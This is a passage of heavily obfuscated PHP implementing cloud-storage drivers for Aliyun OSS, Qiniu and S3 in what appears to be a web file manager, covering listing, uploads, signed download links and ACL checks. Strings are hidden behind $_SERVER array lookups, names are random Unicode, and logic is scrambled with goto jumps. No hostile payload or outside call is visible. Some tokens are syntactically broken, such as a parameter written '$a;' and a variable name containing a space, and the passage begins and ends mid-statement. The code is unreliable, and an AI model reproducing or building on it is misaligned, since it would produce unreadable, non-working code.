$aք[$E[1167]][$E[1168]], $E[106] => strtotime($aք[$E[1165]])); } if (isset($Bܠ٦[$E[106]])) { $Dꑌ[$E[106]] = $Bܠ٦[$E[106]]; } if (isset($Bܠ٦[$E[183]])) { $Dꑌ[$E[183]] = $Bܠ٦[$E[183]]; } return $Dꑌ; } public function listPath($bƮ, $dΏ = false) { $cۖټ =& $_SERVER[ԥ]; $b = $this->fileList($bƮ, $cۖټ[8], !0); foreach ($b[$cۖټ[74]] as $BڪǤ => $bʍ) { $b[$cۖټ[74]][$BڪǤ] = $this->folderInfo($bʍ, $bʍ); } foreach ($b[$cۖټ[73]] as $BڪǤ => $bʍ) { $b[$cۖټ[73]][$BڪǤ] = $this->fileInfo($bʍ[$cۖټ[28]], $bʍ); } return $b; } public function has($Aü, $e鵎ϯ = false, $b = true) { goto C喎; C喎: $aҴ =& $_SERVER[ԥ]; $Aü = trim($Aü, $aҴ[8]); $B؏ = empty($Aü) ? $aҴ[33] : $Aü . $aҴ[8]; goto F֩Ŕ; b̓: $b؎֋ = 0; while (!0) { $Aܵ = array($aҴ[1156] => $aҴ[8], $aҴ[182] => $B؏, $aҴ[1157] => $Bԙ, $aҴ[1158] => $Dʺ); try { $f釄 = $this->client->listObjects($this->bucket, $Aܵ); } catch (OSS\Core\OssException $eЃ̐) { break; } $Dʺ = $f釄->getNextMarker(); $C = $f釄->getObjectList(); $a = $f釄->getPrefixList(); if ($e鵎ϯ) { if (count($C) > 1 || count($C) == 1 && $C[0]->getKey() != $B؏) { $fӚꄏ += count($C) - 1; } if (!empty($a)) { $b؎֋ += count($a); } if ($Dʺ === $aҴ[33]) { break; } continue; } if ($b) { if (!empty($C)) { if (count($C) > 1 || $C[0]->getKey() != $B؏) { return !0; } } } else { if (!empty($a)) { return !0; } } if ($Dʺ === $aҴ[33]) { break; } } if ($e鵎ϯ) { return array($aҴ[187] => $fӚꄏ, $aҴ[188] => $b؎֋); } goto Aܦ; Aܦ: return !1; goto eέ; F֩Ŕ: $Dʺ = $aҴ[33]; $Bԙ = 500; $fӚꄏ = 0; goto b̓; eέ: } public function listAll($e) { $aئȄ =& $_SERVER[ԥ]; $A = $this->fileList($e, $aئȄ[33], !0); $Aɕ = array(); foreach ($A[$aئȄ[73]] as $fʈ) { $Aɕ[$fʈ[$aئȄ[28]]] = $fʈ[$aئȄ[77]]; } return $this->listAllFiles($e, array_keys($Aɕ), $Aɕ); } public function canRead($C) { $E =& $_SERVER[ԥ]; $F̐Ŧ = $this->pathAcl($C); return $F̐Ŧ == $E[1169] || $F̐Ŧ == $E[487] ? !0 : !1; } public function canWrite($Aڮ) { $Cۺ޿ = $this->pathAcl($Aڮ); return $Cۺ޿ == $_SERVER[ԥ][487] ? !0 : !1; } public function pathAcl($C) { goto Dꕔ; Bҟ: return $BϾ; goto a邾; C蘋Ҋ: $BϾ = $d龥 == $A[34] ? $this->bucketAcl : $d龥; if ($BϾ == $A[1170]) { return $A[1169]; } if ($BϾ == $A[1171]) { return $A[487]; } goto Bҟ; Dꕔ: $A =& $_SERVER[ԥ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d龥 = $this->client->getObjectAcl($this->bucket, $this->pathEncode($C)); } catch (OSS\Core\OssException $Dե) { return !1; } goto C蘋Ҋ; a邾: } private function chmodPath($D, $F򔥝 = '') { $Eͽ =& $_SERVER[ԥ]; $Bʎѵ = empty($F򔥝) ? $Eͽ[1171] : $F򔥝; $B퉆 = array($Eͽ[34], $Eͽ[181], $Eͽ[1170], $Eͽ[1171]); if (!in_array($Bʎѵ, $B퉆)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($D), $Bʎѵ); } catch (OSS\Core\OssException $a̽ǳ) { return !1; } return !0; } public function getContent($B︲) { return $this->fileSubstr($B︲, -1); } public function setContent($f, $A = '') { $a ˿ =& $_SERVER[ԥ]; try { $c = $this->trafficLimit($a ˿[1172]); $f׬׏͏ = $this->client->putObject($this->bucket, $this->pathEncode($f), $A, $c); } catch (OSS\Core\OssException $Eӫ̖) { return !1; } $C֫ = array($a ˿[1159] => trim($f׬׏͏[$a ˿[1173]], $a ˿[112]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f))); $this->updateObjMeta($f, $C֫); return isset($f׬׏͏[$a ˿[1174]][$a ˿[1121]]) ? (int) $f׬׏͏[$a ˿[1174]][$a ˿[1121]] : strlen($f׬׏͏); } private function updateObjMeta($Cŏ, $fΪ) { $Cŏ = $this->pathEncode($Cŏ); try { $bԤ܎ = array(OSS\OssClient::OSS_HEADERS => $fΪ); $this->client->copyObject($this->bucket, $Cŏ, $this->bucket, $Cŏ, $bԤ܎); } catch (OSS\Core\OssException $fˈ) { return !1; } return !0; } public function upload($f̮ם, $d, $c = false, $A؂ = REPEAT_REPLACE) { $DĞå =& $_SERVER[ԥ]; $C쟒 = trim($f̮ם, $DĞå[8]); $eռ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($DĞå[1159] => @md5_file($d)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($f̮ם))); $eռ = $this->trafficLimit($DĞå[1172], $eռ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($C쟒), $d, $eռ); } catch (OSS\Core\OssException $Fş) { return !1; } return $this->getPathOuter($f̮ם); } public function getHost() { $B =& $_SERVER[ԥ]; $BҖ = explode($B[167], parent::getHost()); return $BҖ[0] . $B[167] . $this->bucket . $B[91] . $BҖ[1]; } public function uploadFormData($AԔ, $E = 3600) { goto C; Aٍ: $f = $this->pathFather($AԔ); $Cُ = array($DĲ[1078] => $B͏, $DĲ[1079] => array(array($DĲ[1177], 0, $F), array($DĲ[1082], $DĲ[1083], $f))); $BƎ = base64_encode(json_encode($Cُ)); goto CƂʾ; E󯭂: $dˍ = date($DĲ[1175], time() + $E夂); $eߑ = new DateTime($dˍ); $B͏ = $eߑ->format(DateTime::ISO8601); goto ä; ä: $C뎮 = strpos($B͏, $DĲ[280]); $B͏ = substr($B͏, 0, $C뎮) . $DĲ[1176]; $F = 1048576000 * 5; goto Aٍ; Aֆ: return $f; goto b֑; C: $DĲ =& $_SERVER[ԥ]; if (!($Fȥ = $this->getHost())) { return !1; } $E夂 = $E; goto E󯭂; CƂʾ: $E = base64_encode(hash_hmac($DĲ[214], $BƎ, $this->secret, !0)); $f = array($DĲ[1088] => $BƎ, $DĲ[1178] => $this->accessKey, $DĲ[1084] => $DĲ[1076], $DĲ[1179] => $E, $DĲ[165] => $Fȥ); $f = $this->trafficLimit($DĲ[1172], $f); goto Aֆ; b֑: } public function multiUploadFormData($dߢٱّ, $cܯ = 3600) { $C̛ѱ =& $_SERVER[ԥ]; if (!($A = $this->getHost())) { return !1; } $d = $this->trafficLimit($C̛ѱ[1172]); $C틆 = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($dߢٱّ), $d); return array($C̛ѱ[205] => $C틆, $C̛ѱ[165] => $A . $C̛ѱ[8] . $this->pathEncode($dߢٱّ), $C̛ѱ[206] => gmdate($C̛ѱ[1180]), $C̛ѱ[89] => $dߢٱّ); } public function multiUploadAuthData($bܣƢ, $C׺ = array()) { goto dޱ; aʰ: $DΣб = array($EÄ[208], $EÄ[33], $EÄ[115], $Eۂ, "\x78\55\157\x73\163\55\144\141\164\x65\72{$Eۂ}", $EÄ[8] . $this->bucket . $EÄ[8] . $d̆ . $c); if (strpos($c, $EÄ[209]) === 0) { $DΣб[0] = $EÄ[210]; if ($A؄ = $this->trafficLimit($EÄ[1172])) { $d̆ = $EÄ[1181]; array_splice($DΣб, 5, 0, $d̆ . $EÄ[4] . $A؄[$d̆]); } } if (isset($C׺[$EÄ[211]]) && $C׺[$EÄ[211]] == $EÄ[212]) { $DΣб[0] = $EÄ[212]; } goto C탉; c񪅖: $A = $EÄ[1183] . $this->accessKey . $EÄ[4] . $Fڣ; if (strpos($c, $EÄ[209]) === 0) { $A = array($EÄ[216] => $A, $EÄ[206] => $Eۂ); if ($A؄) { $A = array_merge($A, $A؄); } } return $A; goto b艓; C탉: if (!empty($C׺[$EÄ[1182]])) { $EЅ˂Ǟ = array_merge(array($DΣб[4]), $C׺[$EÄ[1182]]); sort($EЅ˂Ǟ); $DΣб[4] = implode($EÄ[213], $EЅ˂Ǟ); } $eĞ = implode($EÄ[213], $DΣб); $Fڣ = base64_encode(hash_hmac($EÄ[214], $eĞ, $this->secret, !0)); goto c񪅖; a: $d̆ = $bܣƢ; if (isset($C׺[$EÄ[89]])) { $d̆ = $C׺[$EÄ[89]]; unset($C׺[$EÄ[89]]); } if (isset($C׺[$EÄ[207]])) { $C׺[$EÄ[206]] = $Eۂ; return $this->listUploadParts($d̆, $C׺); } goto aʰ; dޱ: $EÄ =& $_SERVER[ԥ]; $Eۂ = isset($C׺[$EÄ[206]]) ? $C׺[$EÄ[206]] : gmdate($EÄ[1180]); $c = isset($C׺[$EÄ[156]]) ? $C׺[$EÄ[156]] : $EÄ[33]; goto a; b艓: } public function listUploadParts($aծ, $D) { goto e; b: unset($D[$B[207]], $D[$B[211]]); $d = $this->multiUploadAuthData($aծ, $D); if (empty($d)) { return !1; } goto f՚þ; e: $B =& $_SERVER[ԥ]; $Fߟ = parse_url_query($D[$B[156]]); $fǊ = $this->client->listParts($this->bucket, $this->pathEncode($aծ), $Fߟ[$B[205]]); goto Cى; Cى: $c뢘 = $fǊ->getListPart(); $f۟Ã = array(); foreach ($c뢘 as $BЂ) { $f۟Ã[] = array($B[1163] => $BЂ->getPartNumber(), $B[1164] => trim($BЂ->getETag(), $B[112])); } goto b; f՚þ: return array($B[216] => $d, $B[206] => $D[$B[206]], $B[218] => $f۟Ã); goto D׹; D׹: } public function download($Aұˠ, $E꘧) { if ($this->isFolder($Aұˠ)) { return !1; } try { $f = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $E꘧); $f = $this->trafficLimit($_SERVER[ԥ][104], $f); $this->client->getObject($this->bucket, $this->pathEncode($Aұˠ), $f); } catch (OSS\Core\OssException $e) { return !1; } return $E꘧; } public function fileSubstr($c×, $a = 0, $eČ = false) { if ($a === -1) { $Eï = array(); } else { if ($eČ === !1) { $d = $this->size($c×); } else { $d = $a + $eČ - 1; } $Eï = array(OSS\OssClient::OSS_RANGE => "{$a}\x2d{$d}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($c×), $Eï); } catch (OSS\Core\OssException $bӶ) { think_exception($bӶ->getMessage()); return !1; } } private function trafficLimit($eΰ, $Cʺﵺ = array()) { goto c; c: $cӻ =& $_SERVER[ԥ]; if ($eΰ == $cӻ[1172] && $this->isUploadServer() || $eΰ == $cӻ[104] && $this->isFileOutServer()) { return $Cʺﵺ; } $c˂ = floatval($GLOBALS[$cӻ[6]][$cӻ[84]][$cӻ[102]][$eΰ]) * 1024 * 1024 * 8; goto a·ꆟ; a·ꆟ: if (!$c˂) { return $Cʺﵺ; } $c˂ = $c˂ < 819200 ? 819200 : ($c˂ > 838860800 ? 838860800 : $c˂); $Cʺﵺ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($c˂); goto E򄏂; E򄏂: return $Cʺﵺ; goto D; D: } public function link($D߿, $E䉵 = array()) { $Fд =& $_SERVER[ԥ]; if (!$this->exist($D߿) || $this->isFolder($D߿)) { return !1; } try { $E䉵 = $this->trafficLimit($Fд[104], $E䉵); $EВą = $this->client->signUrl($this->bucket, $this->pathEncode($D߿), 3600 * 12, $Fд[212], $E䉵); return $this->getCdnLink($EВą); } catch (OSS\Core\OssException $a) { return !1; } } public function fileOut($cު, $e響 = false, $f׈ = false, $B = '') { goto CΕ; F֬: $b = get_file_mime(get_path_ext($f׈)); if ($b == $b등[197]) { return parent::fileOut($cު, $e響, $f׈, $B); } $e響 = $e響 ? $b등[198] : $b등[199]; goto b簱; b簱: $cžЅ = array(OSS\OssClient::OSS_SUB_RESOURCE => $b등[1184] . rawurlencode("{$e響}\73\146\151\x6c\x65\x6e\141\x6d\145\75{$f׈}")); $cžЅ[OSS\OssClient::OSS_SUB_RESOURCE] .= $b등[1185] . rawurlencode($b); $a¶ = $this->link($cު, $cžЅ); goto C܉; CΕ: $b등 =& $_SERVER[ԥ]; if (!$f׈) { $f׈ = $this->pathThis($cު); } $f׈ = rawurlencode($f׈); goto F֬; C܉: $this->fileOutLink($a¶); goto Dˇޓ; Dˇޓ: } public function fileOutServer($A, $A = false, $A֌ = false, $Aĥ = '') { parent::fileOut($A, $A, $A֌, $Aĥ); } public function fileOutImage($a읡, $A = 250) { $A薢Ֆ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ԥ][1186] . $A); $c = $this->link($a읡, $A薢Ֆ); $this->fileOutLink($c); } public function fileOutImageServer($f۳, $Cƨ = 250) { parent::fileOutImage($f۳, $Cƨ); } public function fileOutLink($f׃) { $b =& $_SERVER[ԥ]; if (!$this->isCdnHost() && substr($f׃, 0, 7) == $b[1091]) { $f׃ = $b[1092] . substr($f׃, 7); } header($b[152] . $f׃); die; } public function hashMd5($c٤ŞԒ, $BɈ = '') { $Bב΃ =& $_SERVER[ԥ]; $B = $this->objectMeta($c٤ŞԒ); if (!$B) { return $Bב΃[33]; } if (!isset($B[$Bב΃[1159]]) && !empty($BɈ)) { $AŽΘ = $this->updateObjMeta($c٤ŞԒ, array($Bב΃[1159] => $BɈ)); $B[$Bב΃[1159]] = $AŽΘ ? $BɈ : $Bב΃[33]; } return isset($B[$Bב΃[1159]]) ? strtolower($B[$Bב΃[1159]]) : $Bב΃[33]; } public function size($C) { $fʨܝ = $this->objectMeta($C); return $fʨܝ ? $fʨܝ[$_SERVER[ԥ][77]] : 0; } public function info($a´) { if ($this->isFolder($a´)) { return $this->folderInfo($a´); } else { if ($this->isFile($a´)) { return $this->fileInfo($a´); } } return !1; } public function exist($fо) { return $this->isFile($fо) || $this->isFolder($fо); } public function isFile($Fܭ) { return !$this->isFolder($Fܭ) && $this->objectMeta($Fܭ); } public function isFolder($Cث٢) { return $this->cacheMethod($_SERVER[ԥ][219], $Cث٢); } protected function objectMeta($a) { return $this->cacheMethod($_SERVER[ԥ][220], $a); } protected function _objectMeta($A) { $eƈ =& $_SERVER[ԥ]; try { $BӋ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($A)); } catch (OSS\Core\OssException $Cﻂ) { $BӋ = !1; } if ($BӋ) { $BӋ[$eƈ[77]] = intval($BӋ[$eƈ[1166]]); } return $BӋ; } protected function _isFolder($f) { $fԂ =& $_SERVER[ԥ]; if ($f == $fԂ[33] || $f == $fԂ[8]) { return !0; } $e͠ = array($fԂ[1156] => $fԂ[8], $fԂ[182] => rtrim($f, $fԂ[8]) . $fԂ[8], $fԂ[1157] => 1, $fԂ[1158] => $fԂ[33]); $Eۚ = $this->client->listObjects($this->bucket, $e͠); if ($Eۚ->getObjectList() || $Eۚ->getPrefixList()) { return !0; } return !1; } } goto FԻ; FԻ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($cʑ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ԥ][1187]; $this->_init($cʑ); } public function _init($EԈ) { foreach ($EԈ as $D => $Cƣ) { if (isset($this->{$D})) { $this->{$D} = $Cƣ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ԥ][1188], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($B, $D = '', $Cɤ¹ = REPEAT_RENAME) { if ($this->setContent($B, $D)) { return $this->getPathOuter($B); } return !1; } public function mkdir($d׻ϔ, $Bǰ = REPEAT_SKIP) { goto a; e: if (!$this->mkfile($DÍڭ)) { return !1; } if (!$this->moveFile($DÍڭ, $d׻ϔ)) { $this->delFile($DÍڭ); return !1; } return $this->getPathOuter($a); goto e΍ֱ; Eꆒߏ: $d׻ϔ = $a . $Aþ[8]; $e = get_path_this($a); $DÍڭ = $d׻ϔ . $e; goto e; a: $Aþ =& $_SERVER[ԥ]; $a = trim($d׻ϔ, $Aþ[8]); if ($this->_isFolder($a)) { return $this->getPathOuter($a); } goto Eꆒߏ; e΍ֱ: } public function copyFile($CΙ, $D̡) { $Fٻ = $this->bucketManager->copy($this->bucket, $CΙ, $this->bucket, $D̡, !0); return $Fٻ ? !1 : !0; } public function moveFile($C, $a) { $bų܎ = $this->bucketManager->move($this->bucket, $C, $this->bucket, $a, !0); return $bų܎ ? !1 : !0; } public function delFile($eˊפ) { $b = $this->bucketManager->delete($this->bucket, $eˊפ); return $b ? !1 : !0; } public function delFolder($eފ) { $Cͽ = $this->fileList($eފ); if (empty($Cͽ)) { return !0; } $dڤכ = 1000; if (count($Cͽ) <= $dڤכ) { return $this->qnDelObj($Cͽ) ? !1 : !0; } foreach (array_chunk($Cͽ, $dڤכ) as $f㖑) { $C舿 = $this->qnDelObj($f㖑); if ($C舿) { return !1; } } return !0; } private function qnDelObj($f򪄾) { $eѕþ = $this->bucketManager->buildBatchDelete($this->bucket, $f򪄾); list($D°, $f˦ʻٽ) = $this->bucketManager->batch($eѕþ); return $f˦ʻٽ; } private function fileList($D, $Cլ = 0) { goto FÜ; F: $E˶ = $d䄃[33]; $f = 1000; $Aξ = $d䄃[33]; goto dԂ; dԂ: $fݍ = array(); while (!0) { list($a, $cϏ) = $this->bucketManager->listFiles($this->bucket, $eܸ, $E˶, $f, $Aξ); if ($cϏ) { return !1; } $E˶ = array_key_exists($d䄃[1158], $a) ? $E˶ = $a[$d䄃[1189]] : $d䄃[33]; foreach ($a[$d䄃[1190]] as $BƓ) { $Cȇ = $BƓ[$d䄃[89]]; if ($Cլ) { $Cȇ = array($d䄃[28] => $Cȇ, $d䄃[77] => $BƓ[$d䄃[1191]]); } $fݍ[] = $Cȇ; } if ($E˶ == $d䄃[33]) { break; } } return $fݍ; goto Aʌ; FÜ: $d䄃 =& $_SERVER[ԥ]; $D = trim($D, $d䄃[8]); $eܸ = empty($D) ? $d䄃[33] : $D . $d䄃[8]; goto F; Aʌ: } public function rename($Eʍ, $f) { return $this->renameObject($Eʍ, $f); } public function fileInfo($Eą, $C = false, $b = array()) { goto d; e֎: if (empty($b)) { $b = $this->objectMeta($Eą); if (!$b) { return $e䈮; } } if (isset($b[$b­[1192]])) { $e䈮[$b­[183]] = $b[$b­[1192]]; } if (isset($b[$b­[1191]])) { $e䈮[$b­[77]] = $b[$b­[1191]]; } goto cۃ; d: $b­ =& $_SERVER[ԥ]; if ($C) { return array($b­[28] => $this->pathThis($Eą), $b­[75] => $this->getPathOuter($b­[8] . $Eą), $b­[29] => $b­[163], $b­[77] => isset($b[$b­[1191]]) ? $b[$b­[1191]] : 0, $b­[156] => $this->ext($Eą)); } $e䈮 = array($b­[28] => $this->pathThis($Eą), $b­[75] => $this->getPathOuter($b­[8] . $Eą), $b­[29] => $b­[163], $b­[183] => 0, $b­[106] => 0, $b­[77] => 0, $b­[156] => $this->ext($Eą), $b­[184] => !0, $b­[185] => !0); goto e֎; cۃ: return $e䈮; goto F; F: } public function folderInfo($D놌ܡ, $Fۗ = false) { goto A; A: $e߳ =& $_SERVER[ԥ]; if ($Fۗ) { return array($e߳[28] => $this->pathThis($D놌ܡ), $e߳[75] => $this->getPathOuter($e߳[8] . $D놌ܡ), $e߳[29] => $e߳[76]); } $C¬Ƌ = array($e߳[28] => $this->pathThis($D놌ܡ), $e߳[75] => $this->getPathOuter($e߳[8] . $D놌ܡ), $e߳[29] => $e߳[76], $e߳[183] => 0, $e߳[106] => 0, $e߳[1137] => !0, $e߳[1138] => !0); goto cˉީ; cˉީ: $D놌ܡ = rtrim($D놌ܡ, $e߳[8]) . $e߳[8]; $Bɰŉˌ = $this->objectMeta($D놌ܡ); if (isset($Bɰŉˌ[$e߳[1192]])) { $C¬Ƌ[$e߳[183]] = $Bɰŉˌ[$e߳[1192]]; } goto Fǚ; Fǚ: return $C¬Ƌ; goto AՐ; AՐ: } public function listPath($c, $f󩲋 = false) { goto A; Cڸ: $CϤ = $Cᯉ = array(); while (!0) { list($c㍕ٿ, $b𜉒) = $this->bucketManager->listFiles($this->bucket, $B, $D, $eԏ, $cꛠ); if ($b𜉒) { return !1; } $D = array_key_exists($F[1158], $c㍕ٿ) ? $D = $c㍕ٿ[$F[1189]] : $F[33]; if (isset($c㍕ٿ[$F[1193]])) { foreach ($c㍕ٿ[$F[1193]] as $eԗ) { if ($eԗ == $B) { continue; } $CϤ[] = $this->folderInfo($eԗ, $f󩲋); } } if (isset($c㍕ٿ[$F[1190]])) { foreach ($c㍕ٿ[$F[1190]] as $eۓ) { if ($eۓ[$F[89]] == $B) { continue; } $Cᯉ[] = $this->fileInfo($eۓ[$F[89]], $f󩲋, $eۓ); } } if ($D == $F[33]) { break; } } return array($F[74] => $CϤ, $F[73] => $Cᯉ); goto d΋χ; A: $F =& $_SERVER[ԥ]; $c = trim($c, $F[8]); $B = empty($c) ? $F[33] : $c . $F[8]; goto C; C: $D = $F[33]; $eԏ = 1000; $cꛠ = $F[8]; goto Cڸ; d΋χ: } public function has($B, $F݈ = false, $Cǥɨ = true) { goto E݇; eԃ: $e񃔛 = 0; $aҊ = 0; while (!0) { list($B, $E܄) = $this->bucketManager->listFiles($this->bucket, $B΂, $f׳붆, $Cʤ, $Aߛ); if ($E܄) { return !1; } $f׳붆 = array_key_exists($E[1158], $B) ? $f׳붆 = $B[$E[1189]] : $E[33]; if ($F݈) { if (!empty($B[$E[1190]])) { $e񃔛 += count($B[$E[1190]]); } if (!empty($B[$E[1193]])) { $aҊ += count($B[$E[1193]]); } if ($f׳붆 === $E[33]) { break; } continue; } if ($Cǥɨ) { if (!empty($B[$E[1190]])) { return !0; } } else { if (!empty($B[$E[1193]])) { return !0; } } if ($f׳붆 == $E[33]) { break; } } goto Aǫ; A셔: $f׳붆 = $E[33]; $Cʤ = 1000; $Aߛ = $E[8]; goto eԃ; Aǫ: if ($F݈) { return array($E[187] => $e񃔛, $E[188] => $aҊ); } return !1; goto fЇ; E݇: $E =& $_SERVER[ԥ]; $B = trim($B, $E[8]); $B΂ = empty($B) ? $E[33] : $B . $E[8]; goto A셔; fЇ: } public function listAll($c鐩) { $dݵ =& $_SERVER[ԥ]; $Dᄮ = $this->fileList($c鐩, 1); $D = array(); foreach ($Dᄮ as $Fӎ) { $D[$Fӎ[$dݵ[28]]] = $Fӎ[$dݵ[77]]; } return $this->listAllFiles($c鐩, array_keys($D), $D); } public function canRead($Bʐㆄ) { return $this->exist($Bʐㆄ) ? !0 : !1; } public function canWrite($e̮߄) { return $this->exist($e̮߄) ? !0 : !1; } public function getContent($e) { return $this->fileSubstr($e, 0, -1); } public function setContent($aˊ, $C = '') { $a서珓 = $this->tempFile($this->pathThis($aˊ)); file_put_contents($a서珓, $C); if ($this->upload($aˊ, $a서珓)) { $this->tempFileRemve($a서珓); return !0; } return !1; } public function refreshUrls($d؛) { goto Cѐ֤; bߋ: $bĴ = new Qiniu\Cdn\CdnManager($this->auth); list($d󜧅, $a) = $bĴ->refreshUrls($aӦڐ); if ($a) { return !1; } goto Bڶ; Bڶ: return $d󜧅[$eښ[1194]] == $eښ[680] ? !0 : !1; goto F̬ח; Cѐ֤: $eښ =& $_SERVER[ԥ]; $aӦڐ = array(); if (is_array($d؛)) { foreach ($d؛ as $C׉) { $aӦڐ[] = $this->link($C׉); } } else { $aӦڐ[] = $this->link($d؛); } goto bߋ; F̬ח: } public function fileSubstr($C, $CŞ, $Bͫ) { $BВ =& $_SERVER[ԥ]; if (!($D = $this->link($C))) { return !1; } $Bٲҿ = !1; if ($Bͫ > 0) { $Dꋎ͐ = $CŞ + $Bͫ - 1; $Bٲҿ = array($BВ[1195] . $CŞ . $BВ[408] . $Dꋎ͐); } $EǼ = url_request($D, $BВ[212], !1, $Bٲҿ); return $EǼ[$BВ[673]] ? $EǼ[$BВ[1017]] : !1; } public function upload($fȨ, $F, $e = false, $Cݟ = REPEAT_REPLACE) { $eꟴ = new Qiniu\Storage\UploadManager(); $e뇋 = $this->auth->uploadToken($this->bucket, $fȨ); $fآ = get_file_mime(get_path_ext($F)); list($aϰ, $e) = $eꟴ->putFile($e뇋, $fȨ, $F, null, $fآ); return $e ? !1 : $this->getPathOuter($fȨ); } public function uploadFormData($D⅊, $B򉿕 = 3600) { return $this->uploadToken($D⅊, $B򉿕); } public function multiUploadFormData($Eǿ, $b = 3600) { return $this->uploadToken($Eǿ, $b); } private function uploadToken($dىт, $Fǵ = 3600) { goto fҋ; F죇: $e = http_type() . "\72\57\x2f\x75\160\154\157\x61\144{$b˗}\56\161\151\x6e\x69\165\160\56\143\157\x6d\57"; return array($b҂[1199] => $C؇, $b҂[1200] => $e); goto E; a띿⷗: $Aɑ = null; $C؇ = $this->auth->uploadToken($this->bucket, $Aɑ, $d⦧, $F٬, !0); $b˗ = empty($this->region) || $this->region == $b҂[1198] ? $b҂[33] : $b҂[408] . $this->region; goto F죇; fҋ: $b҂ =& $_SERVER[ԥ]; $d⦧ = $Fǵ; $F٬ = array($b҂[1196] => $b҂[1197]); goto a띿⷗; E: } public function download($f, $Eζ) { goto dí; c銏: fclose($EȆ); return $Eζ; goto c; E׳ޤ: $E݃ = 1024 * 200; $EȆ = fopen($Aϡͨ, $_SERVER[ԥ][1201]); while (!0) { $A = $this->fileSubstr($f, $C̜, $E݃); if ($A === !1) { return !1; } fwrite($EȆ, $A); $C̜ += $E݃; if (strlen($A) < $E݃) { break; } } goto c銏; dí: $Aϡͨ = IO::getPathInner(IO::mkfile($Eζ)); if (!($fפ = $this->link($f))) { return !1; } $C̜ = 0; goto E׳ޤ; c: } public function link($aŐ, $FƎ = '') { if (!$this->isFile($aŐ)) { return !1; } $Eܹ˰ = $this->getHost() . $_SERVER[ԥ][8] . $this->pathEncode($aŐ) . $FƎ; return $this->auth->privateDownloadUrl($Eܹ˰, 3600 * 12); } public function fileOut($eߒ, $eӻ = false, $E = false, $Bǚļ = '') { $f憰 =& $_SERVER[ԥ]; if (!$E) { $E = $this->pathThis($eߒ); } $eď = $eӻ ? $f憰[1202] . rawurlencode($E) : $f憰[33]; $b = $this->link($eߒ, $eď); $this->fileOutLink($b); } public function fileOutServer($E˄, $F˄ = false, $a = false, $dѯ = '') { parent::fileOut($E˄, $F˄, $a, $dѯ); } public function fileOutImage($Eō, $cƮ = 250) { $B = $this->link($Eō, $_SERVER[ԥ][1203] . $cƮ); $this->fileOutLink($B); } public function fileOutImageServer($Aԇ, $A = 250) { parent::fileOutImage($Aԇ, $A); } public function hashMd5($f) { $A =& $_SERVER[ԥ]; $b󊵰 = $this->objectMeta($f); return isset($b󊵰[$A[192]]) ? $b󊵰[$A[192]] : !1; $Fҩ = $this->link($f, $A[1204]); } public function size($a֒) { $D = $this->objectMeta($a֒); return $D ? $D[$_SERVER[ԥ][77]] : 0; } public function info($bˌ) { if ($this->isFolder($bˌ)) { return $this->folderInfo($bˌ); } else { if ($this->isFile($bˌ)) { return $this->fileInfo($bˌ); } } return !1; } public function exist($d¾) { return $this->isFile($d¾) || $this->isFolder($d¾); } public function isFile($aѐ) { return !$this->isFolder($aѐ) && $this->objectMeta($aѐ); } public function isFolder($D) { return $this->cacheMethod($_SERVER[ԥ][219], $D); } protected function objectMeta($a;) { return $this->cacheMethod($_SERVER[ԥ][220], $a;); } protected function _objectMeta($Dᷠ) { $fȴ =& $_SERVER[ԥ]; list($DՅ, $fۅʖ) = $this->bucketManager->stat($this->bucket, $Dᷠ); if ($DՅ) { $DՅ[$fȴ[77]] = intval($DՅ[$fȴ[1191]]); } return $DՅ; } protected function _isFolder($dԺ) { $C֫Ӹ =& $_SERVER[ԥ]; list($F, $bӕ) = $this->bucketManager->listFiles($this->bucket, trim($dԺ, $C֫Ӹ[8]) . $C֫Ӹ[8], $C֫Ӹ[33], 1, $C֫Ӹ[8]); return !empty($F[$C֫Ӹ[1190]]) || !empty($F[$C֫Ӹ[1193]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($cϞ߅) { parent::__construct($cϞ߅); } public function uploadFormData($D愺, $fগ = 3600) { goto D与; C螆: $FЬ = array($Eƹɱ[195] => $Eƹɱ[33], $Eƹɱ[1121] => $Eƹɱ[33], $Eƹɱ[1080] => $Cܮ, $Eƹɱ[1084] => $B, $Eƹɱ[1088] => $f, $Eƹɱ[1122] => $Eܾ, $Eƹɱ[1123] => $cގ, $Eƹɱ[1124] => $B˜Վ, $Eƹɱ[1125] => $dСɾ, $Eƹɱ[1126] => $d, $Eƹɱ[165] => $this->getHost()); return $FЬ; goto eޢĉ; eҿɤ: $f = base64_encode(json_encode($dɓ)); $c޸ = hash_hmac($Eƹɱ[1119], $C, $Eƹɱ[1120] . $this->secret, !0); $Eۜԥ = hash_hmac($Eƹɱ[1119], $this->region, $c޸, !0); goto E̡; b֨򝄏: $A¹ = $Eƹɱ[1111]; $dСɾ = $fগ . $Eƹɱ[33]; $B = $Eƹɱ[1076]; goto dʖ; c㳫: $dޒ = $Eƹɱ[59]; $B˜Վ = gmdate($Eƹɱ[1110]); $C = gmdate($Eƹɱ[674]); goto b֨򝄏; E̡: $B = hash_hmac($Eƹɱ[1119], $dޒ, $Eۜԥ, 